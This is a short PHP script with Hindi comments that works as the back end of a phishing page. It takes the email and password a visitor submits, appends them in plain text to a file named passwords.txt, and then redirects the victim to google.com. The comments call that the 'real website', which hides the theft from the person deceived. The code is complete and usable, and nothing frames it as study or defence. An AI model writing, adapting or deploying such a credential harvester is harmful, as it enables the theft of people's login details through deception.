<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['pass'];

    // डेटा को एक स्ट्रिंग में फॉर्मेट करें
    $logData = "Email: " . $email . " | Password: " . $password . "\n";

    // डेटा को 'passwords.txt' नाम की फाइल में सेव करें
    file_put_contents("passwords.txt", $logData, FILE_APPEND);

    // यूजर को असली वेबसाइट पर रीडायरेक्ट करें
    header("Location: https://www.google.com");
    exit();
}
?>
